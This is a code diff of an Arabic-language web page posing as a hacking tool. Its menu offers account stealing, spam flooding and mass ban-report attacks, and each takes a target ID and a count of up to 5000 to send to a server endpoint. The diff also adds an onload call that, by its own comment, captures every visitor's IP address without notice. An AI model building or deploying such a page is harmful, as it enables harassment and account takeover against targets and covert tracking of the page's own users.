@@ -3,12 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tool</title>
+    <title>S-P-A-M</title>
     <style>
-        body { background-color: black; color: white; text-align: center; font-family: cursive; padding-top: 50px; }
-        pre { font-size: 10px; color: #fff; }
-        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; }
-        button { width: 85%; padding: 10px; background-color: white; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
+        body { background-color: black; color: white; text-align: center; font-family: 'Courier New', monospace; padding: 20px; direction: rtl; }
+        pre { font-size: 8px; color: #00ff00; margin-bottom: 20px; }
+        .menu-btn { width: 90%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .hidden { display: none; }
+        input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; }
+        .action-btn { width: 85%; padding: 12px; background-color: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
+        .back-btn { color: #888; text-decoration: underline; cursor: pointer; display: block; margin-top: 15px; }
     </style>
 </head>
 <body>
@@ -32,18 +35,57 @@ u$$$$$$$$$$$$$$$$$$$$$u
           "$$$$$$$$$"
             "$$$$$"
     </pre>
-    <p>Not everywhere there is a law</p>
-    <h3>قسم الإسبام</h3>
-    <input type="text" placeholder="الرابط">
-    <input type="number" placeholder="العدد">
-    <button onclick="send()">ابدأ العملية الآن ✅</button>
+
+    <div id="main-menu">
+        <h3>اختر القسم المناسب:</h3>
+        <button class="menu-btn" onclick="openSection('قسم سحب الحسابات')">1- قسم سحب الحسابات 🎯</button>
+        <button class="menu-btn" onclick="openSection('قسم الإسبام والضرب')">2- قسم الإسبام والضرب ⚔️</button>
+        <button class="menu-btn" onclick="openSection('قسم بلاغات الحظر')">3- قسم بلاغات الحظر 🚫</button>
+    </div>
+
+    <div id="action-section" class="hidden">
+        <h3 id="section-title"></h3>
+        <input type="text" id="target-id" placeholder="الرابط أو الآيدي">
+        <input type="number" id="target-count" placeholder="العدد (الحد الأقصى 5000)" max="5000">
+        <button class="action-btn" onclick="submitData()">ابدأ العملية الآن ✅</button>
+        <span class="back-btn" onclick="goBack()">[ عودة للخلف ]</span>
+    </div>
 
     <script>
-        // إرسال تنبيه بزيارة الرابط تلقائياً
-        fetch('/trace_visit');
+        // سحب الـ IP تلقائياً بمجرد الدخول
+        window.onload = function() {
+            fetch('/api/index?action=trace');
+        };
 
-        function send() {
-            alert("تم الإرسال بنجاح ✅");
+        let currentMode = "";
+
+        function openSection(name) {
+            currentMode = name;
+            document.getElementById('main-menu').classList.add('hidden');
+            document.getElementById('action-section').classList.remove('hidden');
+            document.getElementById('section-title').innerText = name;
+        }
+
+        function goBack() {
+            document.getElementById('main-menu').classList.remove('hidden');
+            document.getElementById('action-section').classList.add('hidden');
+        }
+
+        function submitData() {
+            const id = document.getElementById('target-id').value;
+            const count = document.getElementById('target-count').value;
+            if(!id || !count) return alert("يرجى إكمال البيانات!");
+
+            fetch('/api/index', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    mode: currentMode,
+                    id: id,
+                    count: count
+                })
+            });
+            alert("تم بدء العملية بنجاح، سيتم إشعارك عند الانتهاء ✅");
         }
     </script>
 </body>
